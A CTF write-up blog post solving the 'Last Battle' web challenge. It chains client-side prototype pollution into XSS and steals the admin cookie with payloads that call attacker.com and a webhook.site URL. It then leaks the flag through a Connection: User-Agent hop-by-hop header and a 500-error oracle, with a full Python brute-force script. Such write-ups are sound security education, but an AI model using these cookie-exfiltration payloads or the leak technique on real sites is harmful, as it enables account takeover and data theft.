---
source: kevin-mizu
source_url: https://mizu.re/post/last_battle
title: "Last Battle | mizu.re"
description: "Last Battle"
---

_keyboard\_arrow\_up_

title: Last Battle

date: Dec 25, 2022

tags: [Writeups](https://mizu.re/tag/Writeups) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Last Battle

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/yogosha.svg)

* * *

Difficulty: 500 points \| 4 solves

Description: Now it's time for the last battle! Can you beat Naruto and kill Boruto at the end ? Or will you lose to Naruto and Kurama ? Let's see how you will perform!

Source code: [ToGive.zip](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/sources/ToGive.zip)

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/last_battle#%EF%B8%8F-recon)
- [🏭 CSPP](https://mizu.re/post/last_battle#-cspp)
- [🍪 ATO](https://mizu.re/post/last_battle#-ato)
- [💥 Error Based Leak](https://mizu.re/post/last_battle#-error-based-leak)
- [🦘 Hop by Hop](https://mizu.re/post/last_battle#-hop-by-hop)
- [🎉 Flag](https://mizu.re/post/last_battle#-flag)

## 🕵️ Recon

This challenge was the last and hardest step of the CTF and the only one with the source code. For this one, the website was a note management application developed using [Flask](https://flask.palletsprojects.com/en/2.2.x/).

![home.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/home.png)

_Home page_

The webapp has few features:

- Create note:

![create.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/create.png)

```python
@app.route('/create_paste', methods=['POST'])
def create():
    if 'username' not in session:
        return redirect('/login')
    if len(request.form['paste'])<400:
        paste = create_paste(
            request.form['paste'],
            session['username']
        )
        return render_template("view.html",paste=paste)
    return redirect('/home')
```

Source: _app/app.py_

- Search notes: (return nothing to the client)

![search.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/search.png)

```python
@app.route('/search',methods=["POST"])
@csrf.exempt
def search():
    if 'username' not in session:
        return redirect('/login')
    if 'query' not in request.form:
        return jsonify({"Total":len(get_pastes(session['username']))})
    query = str(request.form.get('query'))
    results = (
        paste for paste in get_pastes(session['username'])
        if query in paste
    )
    try:
        res=next(results)
        agent=request.headers["User-Agent"]
        if len(agent)>10:
            res=agent[0:15]+" is allowed to execute the jutsu: "+res
        else:
            res=agent[0:15]+" is not allowed to execute the jutsu: "+res
        return render_template("view.html",paste="Not Found")
    except StopIteration:
        return render_template("view.html",paste="Not Found")
```

Source: _app/app.py_

- View notes: (just reflect the id parameter)

![view.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/view.png)

```python
@app.route("/view",methods=["GET"])
def view():
    if request.args["id"]:
        id=request.args["id"]
        return render_template("view.html",paste=id)
    else:
        return redirect("/home")
```

Source: _app/app.py_

By looking into the sources, we can figure out that the flag is located in the admin's notes.

```sql
--
-- Dumping data for table `pastes`
--

LOCK TABLES `pastes` WRITE;
/*!40000 ALTER TABLE `pastes` DISABLE KEYS */;
INSERT INTO `pastes` VALUES ('REDACTED','FLAG{REDACTED}','REDACTED');
/*!40000 ALTER TABLE `pastes` ENABLE KEYS */;
UNLOCK TABLES;
```

Source: _db/init.sql_

Furthermore, there is a report option which indicate to us that we have in some way to trick the bot to perform a specific action.

## 🏭 CSPP

From this point, thanks to the recon, we could think about this exploit candidate:

- [XS-Leaks](https://xsleaks.dev/)
- XSS

After looking for XS-Leaks vectors, I didn't find anything. However, a snippet of code caught my attention:

```js
fetch("/search",{method:"POST",credentials:"include"}).then((resp)=>resp.json()).then((data)=>{
    document.getElementById("total").innerText="The total of pastes now: "+data.Total;
}).catch(
    console.log("error")
)
var args = Arg.parse(location.search);
```

Source: _app/templates/view.html_

This part of the code (used for the /view endpoint) is really interesting has it parse the `location.search` content without using the standard [URL](https://developer.mozilla.org/en-US/docs/Web/API/URL) Browser API. This is pretty dangerous has it could lead to CSPP if not well implemented.

What is a Client-Side Prototype Pollution (CSPP)?

In javascript, if an object hasn't a property, the browser will traverse the Prototype Chain. As an example is better than 100 words:

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/CSPP.png)

As you can see, even if the obj.prop is undefined, if object.\_\_proto\_\_.prop exist, his value will be taken instead.

In addition, the prototype is the definition of the current object, editing it will infect all the other similar object.

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/CSPP2.png)

Finally, a CSPP is a prototype pollution which occur in a client-side context.

To detect the vulnerability, the easiest way is to go to:

![CSPP3.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/CSPP3.png)

Has you can see, the Arg.parse function is vulnerable to CSPP. Now that we found it, we need to leverage it to XSS. To do so, we can use the following github repository which references a lot of CSPP gadget to XSS: [link](https://github.com/BlackFan/client-side-prototype-pollution).

From all them, one gadget is perfect in our situation:

![CSPP4.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/CSPP4.png)

Why this one? Because if we look closeling to the `/view` endpoint, there is a google recaptcha feature implemented!

![view.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/view.png)

Thus, going to `/view?id=aa&__proto__[srcdoc]=[<script>alert()</script>]` and we got an alert 🎉

![XSS.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/XSS.png)

## 🍪 ATO

Now that we have an XSS, we want to use it to steal the admin session cookie. Luckily for us, the token isn't [HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) flag which makes it accessible from javascript.

Thus, using the following payload should make the job:

```js
/view?id=aa&__proto__[srcdoc]=[<script>fetch("http://attacker.com%3Fcookie%3D".concat(document.cookie))</script>]
```

_Notice the URL encode content to preserve the URL_

From this point, we could think that we have to send the link to the bot and everything is going to be okey but... Unfortunately, the author of the challenge use `requests.get("http://bot?url="+request.form.get("url"))` to send the URL to the bot which break our input if it isn't properly URL encoded...

Taking everything into account gives us the following link:

```
http://34.204.107.224/view?id=aa%26__proto__%5Bsrcdoc%5D%3D%5B%253Cscript%253Efetch%28%2522https%3A%2F%2Fwebhook.site%2F8a799c24-8959-4607-b6b0-a43e7de2b892%2F%253Fcookie%253D%2522%252Bdocument.cookie%29%253C%2Fscript%253E%5D
```

Sending it to the bot and we get his session cookie 🥳

![ATO.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/ATO.png)

## 💥 Error Based Leak

At this point, we could think that having the admin cookie is equivalent to get his notes and so the flag but, if we remember well there is no option to view the created note... That's why we need to find a way to leak it out of bands.

The most interesting feature for this kind of attack is the `/search` endpoint.

```python
@app.route('/search',methods=["POST"])
@csrf.exempt
def search():
    if 'username' not in session:
        return redirect('/login')
    if 'query' not in request.form:
        return jsonify({"Total":len(get_pastes(session['username']))})
    query = str(request.form.get('query'))
    results = (
        paste for paste in get_pastes(session['username'])
        if query in paste
    )
    try:
        res=next(results)
        agent=request.headers["User-Agent"]
        if len(agent)>10:
            res=agent[0:15]+" is allowed to execute the jutsu: "+res
        else:
            res=agent[0:15]+" is not allowed to execute the jutsu: "+res
        return render_template("view.html",paste="Not Found")
    except StopIteration:
        return render_template("view.html",paste="Not Found")
```

If we analyse deeper the code, it does the following:

- Get all notes associated to our current user.
- Get all notes that match our query pattern.
- Get the first note that match the pattern. (using next function)
- Do weird things with our User-Agent.
- Return nothing.

It is a bit tricky, but the developer made a mistake in this code. In fact, the `try` operation only `except` for `StopIteration` error which raise if there is no note found. This is really interesting for us because, if we find a way to make the code crash (500 error code) after the next() function, we could detect if our search returns at least 1 notes.

Thus, fuzzing the search endpoint could allows us to leak byte by byte the note using the 500 status code.

```
FLAG{a
FLAG{b
FLAG{c
FLAG{d
...
```

Well, we have an exploit idea, but we need to find a crash in this code:

```python
agent=request.headers["User-Agent"]
if len(agent)>10:
    res=agent[0:15]+" is allowed to execute the jutsu: "+res
else:
    res=agent[0:15]+" is not allowed to execute the jutsu: "+res
return render_template("view.html",paste="Not Found")
```

As the code is really small, the only method (with variables that we control) is to remove the `User-Agent` header. If we do so, `request.headers["User-Agent"]` will crash when trying to get the content value.

## 🦘 Hop by Hop

Unfortunately for us, if we try to remove the `User-Agent` header it won't work because the challenge uses an apache in front of the python app as a reverse proxy and if the `User-Agent` isn't set, add it when forwarding the query to the back...

```
<VirtualHost *:*>
    ProxyPreserveHost On
    Header setifempty User-Agent "NarutoBrowseru"
    RequestHeader setifempty User-Agent "NarutoBrowseru"
    ProxyPass / http://0.0.0.0:5000/
    ProxyPassReverse / http://0.0.0.0:5000/
    ServerName localhost
</VirtualHost>
```

Source: _app/000-default.conf_

From this point, there are 2 options for us:

- Finding a 0 day in apache mod\_headers which is in charge of the header parsing.
- Use hop by hop headers to bypass the security 👀

Obviously, we will take the simplest way!

What are hop by hop headers?

Hop by hop headers are design to be used by the proxy that is currently handling the request.

From those headers, there is one which is used to define custom hop by hop headers which need to be consume by the next proxy: Connection:.

This header is really usefull has it allows to remove headers for next hops and possibly change the server output depending of his usage.

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/last_battle/images/hopbyhop.png)_source: [link](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)._

For more details, check this article: [link](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers).

Thus, we can use the `Connection: User-Agent` to enforce apache to remove the `User-Agent` value and make the web application crash!

## 🎉 Flag

To sum up, sending a request on `/search` endpoint with a `query` that has at least 1 matching notes with `Connection: User-Agent` header will make the server crash and return a `500` error 🥳

Now that we have everything to leak the note, we can build the following script to get the flag!

```python
from requests import get, post
from string import printable
from re import findall

# init
cookies = {
    "session": "eyJjc3JmX3Rva2VuIjoiN2M2MTIyOTZhZWRmZGNhM2RjYWYwYmE1ZGE4MDJlODE1MGU5MDI2NSIsInVzZXJuYW1lIjoiaG9ja2FnZSJ9.Y6GIIg.0KKUmMz-uzqJdmb9Ai5uRym9HSQ"
}
flag = "FLAG{"

while 1:
    # search query
    for letter in printable:
        url = "http://34.204.107.224/search"
        headers = {
            "Connection": "User-Agent"
        }
        data = {
            "query": flag + letter
        }

        r = post(url, cookies=cookies, headers=headers, data=data)
        if r.status_code == 500:
            print("LETTER FOUND!", flag + letter)
            flag += letter
            break
    # no letter found, end of flag
    else:
        exit()
```

Flag: `FLAG{h0p_bY_h0p_T0_k1lL_h0pEs}` 🎉

[_keyboard\_arrow\_left_ EJS - Server Side Prototype Pollution gadgets to RCE](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)

[Mission Forum _keyboard\_arrow\_right_](https://mizu.re/post/missions_forum)